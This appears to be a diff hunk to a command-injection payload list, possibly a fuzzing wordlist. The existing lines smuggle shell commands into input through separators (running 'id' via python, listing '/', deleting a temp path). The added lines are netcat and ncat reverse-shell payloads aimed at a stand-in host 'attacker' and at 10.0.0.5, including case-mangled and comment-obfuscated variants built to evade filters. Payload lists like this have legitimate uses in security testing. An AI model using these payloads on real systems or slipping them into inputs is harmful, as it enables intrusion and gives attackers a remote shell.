@@ -30,3 +30,7 @@ a;python -c 'import os;os.system("id")'
 8.8.8.8 || ls /
 x;rm -rf /tmp/x
 || ping -n 5 127.0.0.1
+| nc attacker 4444 -e /bin/sh
+| Nc aTtAcKeR 4444 -E /bIn/sH
+| /*!*/ nc attacker 4444 -e /bin/sh
+; ncat 10.0.0.5 9001 -e /bin/bash
